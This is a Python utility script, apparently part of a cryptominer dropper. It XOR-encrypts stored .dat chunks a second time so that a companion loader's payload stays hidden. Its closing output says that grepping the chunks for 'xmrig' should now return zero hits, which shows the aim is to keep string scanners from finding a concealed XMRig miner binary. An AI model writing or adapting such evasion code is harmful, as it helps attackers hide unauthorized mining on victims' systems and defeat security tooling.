#!/usr/bin/env python3
"""
Apply double XOR encryption to all .dat chunks to hide embedded strings.
This RE-ENCRYPTS existing chunks with an additional XOR layer.
"""

import os
import sys
import glob
import itertools

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CHUNK_DIR = os.path.join(SCRIPT_DIR, '..', 'data')

# Must match loader.py keys
_KEY = b'\x7f\x45\x4c\x46\x02\x01\x01\x00'
_KEY2 = b'\xde\xad\xbe\xef\xca\xfe\xba\xbe'

def old_decrypt(data: bytes) -> bytes:
    """Old single-XOR decrypt."""
    return bytes(a ^ b for a, b in zip(data, itertools.cycle(_KEY)))

def new_encrypt(data: bytes) -> bytes:
    """New double-XOR encrypt."""
    stage1 = bytes(a ^ b for a, b in zip(data, itertools.cycle(_KEY2)))
    stage2 = bytes(a ^ b for a, b in zip(stage1, itertools.cycle(_KEY)))
    return stage2

def reencrypt_all():
    chunks = sorted(glob.glob(os.path.join(CHUNK_DIR, '*.dat')))
    
    if not chunks:
        print(f"ERROR: No .dat files found in {CHUNK_DIR}", file=sys.stderr)
        sys.exit(1)
    
    print(f"Found {len(chunks)} chunks in {CHUNK_DIR}")
    print("Re-encrypting with double XOR to hide strings...\n")
    
    for chunk_path in chunks:
        # 1. Read old single-XOR encrypted chunk
        with open(chunk_path, 'rb') as f:
            old_encrypted = f.read()
        
        # 2. Decrypt to plaintext (old method)
        plaintext = old_decrypt(old_encrypted)
        
        # 3. Re-encrypt with double XOR (new method)
        new_encrypted = new_encrypt(plaintext)
        
        # 4. Write back
        with open(chunk_path, 'wb') as f:
            f.write(new_encrypted)
        
        fname = os.path.basename(chunk_path)
        old_size = len(old_encrypted)
        new_size = len(new_encrypted)
        print(f"  ✓ {fname:<24} {old_size:>7} → {new_size:>7} bytes")
    
    print(f"\n✓ All {len(chunks)} chunks re-encrypted with double XOR.")
    print("  Run: strings data/*.dat | grep -i xmrig")
    print("  Should return ZERO hits now.")

if __name__ == '__main__':
    reencrypt_all()
